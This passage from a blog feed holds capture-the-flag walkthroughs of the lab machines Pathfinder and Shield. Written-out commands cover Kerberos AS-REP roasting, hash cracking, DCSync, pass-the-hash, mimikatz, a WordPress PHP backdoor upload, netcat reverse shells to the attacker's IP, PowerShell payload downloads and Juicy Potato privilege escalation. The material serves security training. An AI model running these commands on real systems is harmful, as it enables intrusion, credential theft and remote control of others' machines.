<code>sandra</code>and <code>svc_bes</code>accounts are user created ones. As you can see, I highlighted the <code>svc_bes</code>account because it has enabled the<strong><code>DONT_REQ_PREAUTH</code></strong> flag.</p><p>Now I&apos;ll simply explain what the kerberos authentication is. If you need to know what <code>DONT_REQ_PREAUTH</code> flag means, you must understand the<strong> kerberos authentication </strong>before.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaF3QozWJmcpKh919-T%2F-MaF5pftRxID2hv08kO6%2Fimage.png?alt=media&amp;token=c0162370-9528-4d00-9132-23921274ab6c" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"></figure><p>This draft shows you how the normal authentication process. But if <code>DONT_REQ_PREAUTH</code> flag is set, <strong>second </strong>and <strong>third </strong>steps of the process can be missed. That means you can directly request the service ticket. Click <a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)" rel="noopener noreferrer">here</a> if you need more information about kerberos authentication.</p><hr><h2 id="02-foothold"><strong>02. Foothold</strong></h2><p>Now we are going to use <a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">impacket&apos;s</a> <code>GetNPUsers.py</code> script to grab the request service ticket.</p><p>Type below commands to grab the request ticket.</p><pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-pass -format john</code></pre><pre><code>-request   : Requests TGT for users and output them in JtR/hashcat format (default False)
-no-pass   : Don&apos;t ask for password (useful for Kerberos authentication)
-dc-ip     : IP Address of the domain controller.
-format    : Format to save the AS_REQ of users without pre-authentication. Default is hashcat</code></pre><p>Output will be like this. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-72.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1348" height="171" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-72.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-72.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-72.png 1348w" sizes="(min-width: 720px) 720px"></figure><p>We grabbed the ticket. Now it&apos;s time to powerup <a href="https://www.openwall.com/john/" rel="noopener noreferrer">John the Ripper</a> and crack the hash. First of all copy that hash to file then run the <code>john</code>.&#x1F920;&#x1F920;</p><pre><code class="language-bash">john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-73.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1344" height="320" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-73.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-73.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-73.png 1344w" sizes="(min-width: 720px) 720px"></figure><p>We got the password for <code>svc_bes</code> !!!</p><ul><li><code>svc_bes :<strong> </strong>Sheffield19</code></li></ul><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-74.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="508" height="288"></figure><p>Now since we have the username and password, we can use <a href="https://github.com/Hackplayers/evil-winrm" rel="noopener noreferrer">Evil-WinRM</a> tool. You can simply install it by typing <code>gem install evil-winrm</code> and hit enter, then the tool will be installed to your machine. &#x1F60E;&#x1F60E;</p><p>Now, Don&apos;t you have a question &#x2753; We already have the username and password for user <strong>sandra</strong>. Why didn&apos;t we use it? It&apos;s because there is nothing inside that account. It&apos;s just a simple user account.</p><p>Let&apos;s run the tool for <code>svc_bes</code> account.</p><pre><code class="language-bash">evil-winrm -u svc_bes -p Sheffield19 -i 10.10.10.30
</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-75.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="569" height="205"></figure><p>So we got the user flag. Now, time to <strong>escalate privileges</strong>.</p><hr><h2 id="03-privilege-escalation"><strong>03. Privilege Escalation</strong></h2><p>Now we are going to perform <a href="https://www.qomplx.com/kerberos_dcsync_attacks_explained/" rel="noopener noreferrer">DCSync attack</a> and dump the NTLM hashes of all domain users using the Impacket&apos;s <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py" rel="noopener noreferrer">secretsdump.py </a>script. &#x1F608;&#x1F608; Let&apos;s try it</p><pre><code class="language-bash"> /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30</code></pre><p>Here is the output. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFHcLpM7vaCNtrd5wF%2F-MaFNNHT8ij_UjXd4Vsa%2Fimage.png?alt=media&amp;token=812cb165-e2ee-4b77-8ad7-9f606011a238" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"></figure><p><br>As you can see, We have NTLM hash for the Administrator account. We can use this to perform <strong><strong><a href="https://en.wikipedia.org/wiki/Pass_the_hash">Pass The Hash attack</a></strong></strong> and gain elevated access to the system. Also we can use Impacket&apos;s<a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py" rel="noopener noreferrer"> psexec.py</a> for this too.</p><p>See how &#xA0;<a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">impacket</a> &#xA0;helps us during this machine. Give respect to the <a href="https://www.secureauth.com/" rel="noopener noreferrer">SecureAuth Corporation</a>. &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><h3 id="031-perform-pass-the-hash-attack"><strong>03.1 Perform Pass The Hash Attack</strong></h3><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/05/image-87.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"></figure><p>First, copy the above Administrator&apos;s hash without triple colon (:::) at the end and then type this.</p><pre><code class="language-bash">/usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes &lt;NTML hash&gt;</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-76.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1880" height="564" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-76.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-76.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-76.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-76.png 1880w" sizes="(min-width: 720px) 720px"></figure><p><br>We got the root flag too!!. &#x1F9D0;&#x1F9D0;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-77.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="845" height="762" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-77.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-77.png 845w" sizes="(min-width: 720px) 720px"></figure><hr><h3 id="04-post-exploitation"><strong>04. Post Exploitation</strong></h3><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/05/image-88.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"></figure><p>Since these boxes are all connected, we are going to grab the local admin hash too. So let&#x2019;s upload <a href="https://github.com/gentilkiwi/mimikatz/wiki" rel="noopener noreferrer">mimikatz.</a> You can download &#xA0;<code>mimikatz</code> tool from <a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip" rel="noopener noreferrer">here</a> and upload it to the box using python demon web server.</p><pre><code class="language-bash">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip &amp;&amp; unzip mimikatz_trunk.zip &amp;&amp; cd x64 &amp;&amp; python3 -m http.server</code></pre><pre><code class="language-bash">powershell.exe -c &quot;IWR -useBasicParsing http://&lt;YourIP&gt;:8000/mimikatz.exe -o mcat.exe&quot;</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-78.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1249" height="917" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-78.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-78.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-78.png 1249w" sizes="(min-width: 720px) 720px"></figure><p>Then we can run that file by typing <code>.\mcat</code> And then run the <code>lsadump::sam</code> command.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFPGC9ij8JayLKr9eX%2F-MaFVUjWTVrs7MfwbN4e%2Fimage.png?alt=media&amp;token=4b7381e5-b523-4a4a-88d5-dc45afc5c074" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"></figure><p>Here is the hash : 7facdc498ed1680c4fd1448319a8c04f</p><p>You can decode it through the <a href="https://crackstation.net/" rel="noopener noreferrer">crackstation </a>site.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFVfK7TEHx4qpr0UnI%2F-MaFX51eTjy22bDTPq1y%2Fimage.png?alt=media&amp;token=9968dc48-bcc7-4baf-b418-114c36f1ef37" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"></figure><p>The password is : <code>Password!</code></p><p>Finally we are done. and from here you must have <strong>VIP or VIP+</strong> &#xA0;membership to play with other boxes.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-79.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="389" height="241"></figure><p>Okay... I&#x2019;ll see you on the next box! <strong><a href="https://h4rithd.com/blog/starting-point-htb-included-walkthrough/index.html">Included</a></strong> &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><br><strong><strong>Find me on </strong></strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Shield Walkthrough]]></title><description><![CDATA[After the Vaccine Walkthrough, here I'm with Shield box. Let's hack and grab the flags.

]]></description><link>https://h4rithd.com/blog/starting-point-htb-shield-walkthrough/</link><guid isPermaLink="false">60b6627ba8ce8209ffb55da3</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Shield Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Sat, 01 May 2021 16:44:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/ShieldBG.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/ShieldBG.jpg" alt="Shield Walkthrough"><p>After the Vaccine Walkthrough, here I&apos;m with Shield box. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;<strong>very easy</strong>&quot; and should be <strong>rooted in a sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="https://h4rithd.com/blog/vaccine-walkthrough/index.html">Vaccine </a>machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong><em>Disclaimers: </em></strong><em>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong>00. Start Machine &#x2026;</strong></h2><p>To start the machine, just click on &quot;<strong>Join Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-152.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="446" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-152.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-152.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine. <strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma8rCTSABTSH_XeG1Vi%2F-Ma8ssSW-inIrWZ0ACd2%2Fimage.png?alt=media&amp;token=b3e10e07-6b98-4526-a81c-461351c2569b" class="kg-image" alt="Shield Walkthrough" loading="lazy"></figure><p>Before going to enumeration steps we can simply ping to the IP address and check whether &#xA0;the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-123.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1516" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-123.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-123.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-123.png 1516w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, it&apos;s <code>TTL=127</code>. There is only one route between machine and us (VPN). So definitely it will be a <code>Windows</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6"><strong>01. Enumeration First &#x2026;</strong></h2><h3 id="011-fast-ports-scan"><strong>01.1 Fast ports scan</strong></h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.29</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-124.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="700" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-124.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-124.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Really? There are only two ports open. &#x1F611;&#x1F611;&#x1F636;</p><h3 id="%E2%80%8C012-run-nmap-scripting-engine"><strong>&#x200C;01.2 Run Nmap Scripting Engine</strong></h3><p>To get the best result, We can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 80,3306 10.10.10.29</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-125.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="510" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-125.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-125.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>There are 2 main ports. One is running <code>webserver</code> and other one is running <code>MySQL server</code>. &#x1F937;&#x200D;&#x2642;&#xFE0F;&#x1F937;&#x200D;&#x2642;&#xFE0F;</p><h3 id="013-discover-more-on-port-80"><strong>01.3 Discover more on port 80</strong></h3><p>&#x1F575;&#xFE0F;&#x200D;&#x2640;&#xFE0F; Now we have only two open ports, so I chose <strong>port 80</strong> first. Now you have a pretty big idea about what we need to do with port 80 right? Let&apos;s open our web browser, type 10.10.10.29 and then hit enter.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-127.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="552" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-127.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-127.png 1000w" sizes="(min-width: 720px) 720px"></figure><p><br>What the hell! Feel like there are more steps, &#x1F616; Now we need to find whether there are any other directories here?</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-128.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="236" height="177"></figure><p><br>Again it&apos;s time to start fuzzing. I have already told you how to use <a href="https://app.gitbook.com/@shapmanasick/s/starting-point-htb/oopsie-walkthrough#02-foothold"><code>dirsearch</code></a>tool in <a href="https://h4rithd.com/blog/starting-point-htb-oopsie-walkthrough/index.html">oopsie </a>walkthrough. Now it&apos;s time to learn a new cool tool right. &#x1F60D;&#x1F60E; The tool is <a href="https://github.com/ffuf/ffuf" rel="noopener noreferrer"><code>ffuf</code></a>. A fast web fuzzer written in Go.</p><blockquote><em>You can download and install this tool by reading </em><a href="https://github.com/ffuf/ffuf#installation" rel="noopener noreferrer"><em>this</em></a><em>. It must be installed on your OS if you are willing to face OSCP. Because it helps a lot more than ordinary </em><a href="https://tools.kali.org/web-applications/wfuzz" rel="noopener noreferrer"><em><code>Wfuzz</code></em></a><em> tool.</em></blockquote><p>Let&apos;s enumerate the web directories!!</p><pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.29/FUZZ</code></pre><p>Here is the output. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-129.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="605" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-129.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-129.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>So we have only one directory and it is <strong>wordpress</strong>. Let&apos;s jump to our web browser and navigate to the <code>http://10.10.10.29/wordpress</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-130.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="548" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-130.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-130.png 1000w" sizes="(min-width: 720px) 720px"></figure><p><br>Now you can see there is a wordpress site hosted on the server. So now, time to use <code>wpscan</code> tool. By using this tool we can do lots of things on <strong>Wordpress CMS </strong>like enumerating plugins, users, themes, backups and also we can use this tool to brute force wordpress passwords.</p><pre><code class="language-bash">wpscan --url http://10.10.10.29/wordpress -e u</code></pre><p>Here is the output. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-131.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="869" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-131.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-131.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>So as you can see there is only one user called <code>admin</code> in this wordpress site. Let&apos;s brute force that user using <strong>rockyou </strong>password list.</p><pre><code class="language-bash">wpscan --url http://10.10.10.29/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt</code></pre><p>But wait, &#x270B;&#x270B;</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma8rCTSABTSH_XeG1Vi%2F-Ma9Pbupd4vbukgizp1h%2Fimage.png?alt=media&amp;token=05b1b1e8-042d-42e7-84f6-e05912141401" class="kg-image" alt="Shield Walkthrough" loading="lazy"></figure><p><br>Password brute forcing is more time consuming here. Since these boxes are in sequence, we can check previous credentials. &#x1F644;&#x1F644; in <a href="https://h4rithd.com/blog/vaccine-walkthrough/index.html">vaccine </a>walkthrough we had found some passwords, if you check one by one you will get the right one. here it is <code>P@s5w0rd!</code> &#xA0;So the credentials for wordpress login are</p><p><code>admin : P@s5w0rd!</code></p><p>And if you are not familiar with wordpress sites, <code>/wp-admin</code> is the login page for most of the wordpress sites and it is the default login path. bla bla bala... &#x1F971;</p><p>Anyway go to your browser again and navigate to<code>http://10.10.10.29/wordpress/wp-admin</code> . Now you are end up at login page.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-132.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="523" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-132.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-132.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Now you can enter above credentials &#x261D;&#x261D; and click enter. You are successfully logging to the wordpress site as admin. &#x1F451;&#x1F451;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-133.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1341" height="735" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-133.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-133.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-133.png 1341w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="02-foothold"><strong>02. Foothold</strong></h2><p>Now it&apos;s time to upload reverse shell. But keep in mind that you are on the Windows machine. So you must have <code>windows php reverse shell</code> to gain access. Let&apos;s upload a bind shell. You can download it from <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php" rel="noopener noreferrer">here</a>. And also we need netcat binary file to get reverse shell. You can download it from <a href="https://github.com/int0x33/nc.exe?files=1" rel="noopener noreferrer">here</a>. &#x1F60A;&#x1F60A;</p><pre><code class="language-bash">wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/simple-backdoor.php
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe</code></pre><p>By looking at the dashboard settings, it&apos;s obvious that we have an option to upload media, themes, pages, etc. I&#x2019;ll start from the themes to see what we can do.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-134.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="784" height="692" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-134.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-134.png 784w" sizes="(min-width: 720px) 720px"></figure><p>Then click Add New button.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-135.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="955" height="513" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-135.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-135.png 955w" sizes="(min-width: 720px) 720px"></figure><p><br>Browse and upload both netcat binary and bind shell php script.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-136.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1071" height="541" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-136.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-136.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-136.png 1071w" sizes="(min-width: 720px) 720px"></figure><p>Click &quot;Install Now&quot; button to upload. When you upload the files, You might get an error like this. It&apos;s just ok to ignore this error. &#x1F609;&#x1F609;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-137.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1029" height="388" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-137.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-137.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-137.png 1029w" sizes="(min-width: 720px) 720px"></figure><p>Then navigate to<code>http://10.10.10.29/wordpress/wp-content/Uploads/simple-backdoor.php?cmd=dir</code></p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9a8-AHdQanTEn7xXX%2Fimage.png?alt=media&amp;token=3d967050-fde1-47d1-8870-9d35b320079e" class="kg-image" alt="Shield Walkthrough" loading="lazy"></figure><p>As you can see, now we have a simple bind shell. Let&apos;s gain reverse shell using this with the help of our netcat binary file. First, power up a netcat listener then navigate to following url. (Change the <code>&lt;YourIP&gt;</code> and <code>&lt;PORT&gt;</code> as yours). <code>%20</code> is indicated as space in url encoding. &#x1F60B;&#x1F60B;</p><p><code>http://10.10.10.29/Wordpress/wp-content/Uploads/simple-backdoor.php?cmd=.\nc.exe%20-e%20cmd.exe%20&lt;YourIP&gt;%20&lt;PORT&gt;</code></p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9bcymZhCbDUY9MRSH%2Fimage.png?alt=media&amp;token=3d2aa86d-f7d5-4d2d-bdce-ee98818a8ba4" class="kg-image" alt="Shield Walkthrough" loading="lazy"></figure><p>Now we are on the box as <code>iusr</code> user. Let&apos;s find the user flag.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma9_ZUgRZPcsIQ0dCtu%2F-Ma9byqS0wXbsGl3qeD3%2Fimage.png?alt=media&amp;token=759afd63-8c52-4703-a203-ca2b4566d705" class="kg-image" alt="Shield Walkthrough" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-138.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="480" height="200"></figure><p>Here we have one user called <code>sandra</code> and we don&apos;t have access to this account. It&apos;s means this is time to <strong>escalate privileges</strong>.</p><hr><h2 id="03-privilege-escalation"><strong>03. Privilege Escalation</strong></h2><p>Let&apos;s enumerate further to get any vulnerability to gain privilege access. First, we need to check system info.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-139.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="926" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-139.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-139.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Then check what privileges we have now.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-140.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1000" height="349" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-140.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-140.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Woooh!! We have the <code>SeImpersonatePrivilege</code> enabled. &#x1F929;&#x1F929; You know what it means, it means we can run <a href="https://github.com/ohpe/juicy-potato" rel="noopener noreferrer">juicy potato</a> to gain privilege. &#x1F954;&#x1F954;Let&apos;s do it..</p><blockquote><em>Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the </em><code><em>SeAssignPrimaryToken</em></code><em> or </em><code><em>SeImpersonate</em></code><em> privilege in a MiTM attack.</em></blockquote><p>Download the <a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe" rel="noopener noreferrer">JuicyPotato </a>binary file and rename it to another file name. Because sometimes windows defender will hate us. And we need to upload it to the box. To do so, power up python demon web server on your machine.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# mv JuicyPotato.exe potato.exe

&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>Then we need to upload it in to the box. Type the following command on windows machine <code>(Change &lt;YourIP&gt;)</code>.</p><pre><code class="language-bash">Powershell -c &quot;IWR -useBasicParsing http://&lt;YourIP&gt;:8000/potato.exe -o potato.exe&quot;</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-143.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1208" height="270" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-143.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-143.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-143.png 1208w" sizes="(min-width: 720px) 720px"></figure><p><br>If you read the <a href="https://github.com/ohpe/juicy-potato" rel="noopener noreferrer">documentation </a>of Juicy Potato you will realize it needs Batch file to run. So now we need to create bat file using following commands.</p><pre><code class="language-bash">echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe YourIP YourPort &gt; sh3ll.bat</code></pre><p>Change <code>YourIP</code>and <code>YourPort</code>as yours. After create the batch file, view that file using <code>type</code>command to verify.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-144.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1461" height="132" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-144.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-144.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-144.png 1461w" sizes="(min-width: 720px) 720px"></figure><p><br>Then all the things are fine. Now it&apos;s time to exploit. Let&apos;s power up netcat listener again and execute the following command. If you failed to get reverse shell; change the <code>-c</code> parameter (CLSID) from using <a 